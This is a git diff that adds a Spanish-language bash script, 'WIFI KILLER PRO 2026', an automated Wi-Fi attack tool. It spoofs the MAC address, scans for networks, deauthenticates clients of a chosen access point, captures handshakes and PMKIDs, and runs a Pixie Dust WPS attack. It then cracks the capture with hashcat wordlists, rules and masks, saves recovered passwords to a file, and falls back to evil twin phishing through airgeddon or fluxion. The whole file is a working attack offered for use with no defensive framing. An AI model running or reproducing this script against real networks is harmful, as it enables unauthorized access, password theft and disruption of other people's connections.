@@ -1,1 +1,126 @@
-xd
+#!/bin/bash
+# =============================================
+# WIFI KILLER PRO 2026 - Modo más sucio y automático
+# =============================================
+
+echo -e "\e[31m[!!] WIFI KILLER PRO INICIADO - Sin piedad\e[0m"
+
+# === INSTALACIÓN AUTOMÁTICA DE HERRAMIENTAS ===
+echo "[+] Actualizando e instalando herramientas necesarias..."
+sudo apt update -qq
+
+sudo apt install -y aircrack-ng hashcat hcxdumptool hcxtools reaver pixiewps macchanger airgeddon fluxion wireshark tshark wordlists
+
+# Si hcxdumptool no está bien instalado (a veces pasa en Kali reciente)
+if ! command -v hcxdumptool &> /dev/null; then
+    echo "[+] Compilando hcxdumptool desde cero..."
+    git clone https://github.com/ZerBea/hcxdumptool.git /tmp/hcxdumptool 2>/dev/null
+    cd /tmp/hcxdumptool && make -j$(nproc) && sudo make install
+    cd /tmp && rm -rf hcxdumptool
+fi
+
+echo "[+] Todas las herramientas instaladas/actualizadas."
+
+# === 1. MODO MONITOR + SPOOF MAC ===
+sudo airmon-ng check kill
+
+INTERFACES=$(iw dev | grep Interface | awk '{print $2}' | head -n1)
+MAIN_IFACE=${INTERFACES:-wlan0}
+
+sudo ip link set "$MAIN_IFACE" down
+sudo macchanger -r "$MAIN_IFACE"   # Cambia MAC por seguridad
+sudo airmon-ng start "$MAIN_IFACE" > /dev/null 2>&1
+MON_IFACE="${MAIN_IFACE}mon"
+
+echo "[+] Interfaz en modo monitor: $MON_IFACE | MAC spoofed"
+
+# === CARPETA DE CAPTURAS ===
+DATE=$(date +%Y-%m-%d_%H-%M)
+mkdir -p "capturas/$DATE"
+cd "capturas/$DATE" || exit
+
+# === 2. ESCANEO CON CLIENTES ===
+echo "[+] Escaneando redes con clientes (40 seg)..."
+timeout 40 sudo airodump-ng -w scan --output-format csv "$MON_IFACE" > /dev/null 2>&1
+
+echo -e "\n=== REDES CON CLIENTES ACTIVOS ==="
+awk -F, 'NR>1 && $6 ~ /[0-9]+/ {print $1 " | Canal:" $4 " | ESSID:" $14}' scan-01.csv | grep -E '([0-9A-Fa-f]{2}:){5}' | sort -u
+
+# === 3. SELECCIÓN DE OBJETIVO ===
+read -p "Pega el BSSID del objetivo: " BSSID
+read -p "Canal (Enter = auto): " CHANNEL
+
+if [ -z "$CHANNEL" ]; then
+    CHANNEL=$(awk -F, -v b="$BSSID" '$1 ~ b {print $4}' scan-01.csv | head -n1)
+fi
+
+echo "[+] Objetivo: $BSSID | Canal: $CHANNEL"
+
+# === 4. ATAQUE PRINCIPAL ===
+sudo airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$BSSID" "$MON_IFACE" > /dev/null 2>&1 &
+AIRODUMP_PID=$!
+
+sleep 4
+
+echo "[+] Deauth + PMKID Attack..."
+sudo aireplay-ng -0 12 -a "$BSSID" "$MON_IFACE" > /dev/null 2>&1
+sudo hcxdumptool -i "$MON_IFACE" --enable_status=3 --filterlist_ap="$BSSID" -o pmkid.pcapng --stop_ap_attacks=180 > /dev/null 2>&1 &
+
+sleep 15
+sudo killall hcxdumptool 2>/dev/null
+
+# === 5. PIXIE DUST SI TIENE WPS ===
+echo "[+] Chequeando WPS..."
+if sudo wash -i "$MON_IFACE" -c "$CHANNEL" -B "$BSSID" 2>/dev/null | grep -q WPS; then
+    echo "[+] WPS detectado → Pixie Dust full power"
+    sudo reaver -i "$MON_IFACE" -b "$BSSID" -c "$CHANNEL" -vv -K 1 -L -f -N
+fi
+
+# === 6. CRACKEO AUTOMÁTICO + MOSTRAR CONTRASEÑA ===
+echo "[+] Convirtiendo capturas a formato hashcat..."
+sudo hcxpcapngtool -o hash.hc22000 -E essid.txt "${BSSID}"-01.cap pmkid.pcapng 2>/dev/null
+
+if [ -s hash.hc22000 ]; then
+    echo "[+] Hash encontrado. Iniciando crackeo agresivo..."
+
+    # Crackeo en capas
+    echo "[+] 1. Rockyou + reglas best64..."
+    hashcat -m 22000 -w 3 --force hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --potfile-disable
+
+    echo "[+] 2. Rockyou + d3ad0ne rules (más fuerte)..."
+    hashcat -m 22000 -w 3 --force hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --potfile-disable
+
+    echo "[+] 3. Brute force máscaras comunes..."
+    hashcat -m 22000 -w 3 --force hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d --increment
+    hashcat -m 22000 -w 3 --force hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d?d?d
+
+    # Mostrar contraseña si se encontró
+    PASSWORD=$(hashcat -m 22000 hash.hc22000 --show | awk -F: '{print $2}')
+    if [ -n "$PASSWORD" ]; then
+        echo -e "\e[32m[+] ¡CONTRASEÑA ENCONTRADA! → $PASSWORD\e[0m"
+        echo "$BSSID : $PASSWORD" >> ../contrasenas_encontradas.txt
+    else
+        echo "[-] No se encontró la contraseña con los métodos actuales."
+    fi
+else
+    echo "[-] No se capturó handshake/PMKID útil."
+fi
+
+# === 7. FALLBACK EVIL TWIN ===
+if [ ! -s hash.hc22000 ] || [ -z "$PASSWORD" ]; then
+    echo "[+] Ataque directo falló. ¿Quieres lanzar Evil Twin + Phishing?"
+    read -p "(s/n): " evil
+    if [[ $evil == "s" || $evil == "S" ]]; then
+        echo "1) Airgeddon   2) Fluxion"
+        read -p "Elige: " choice
+        [ "$choice" = "1" ] && sudo airgeddon || (cd /opt/fluxion && sudo ./fluxion.sh)
+    fi
+fi
+
+# === LIMPIEZA ===
+sudo kill $AIRODUMP_PID 2>/dev/null
+sudo airmon-ng stop "$MON_IFACE" > /dev/null 2>&1
+sudo systemctl restart NetworkManager
+
+echo -e "\e[32m[+] Ataque terminado. Todo guardado en capturas/$DATE\e[0m"
+echo "Contraseñas encontradas se guardan en contrasenas_encontradas.txt"
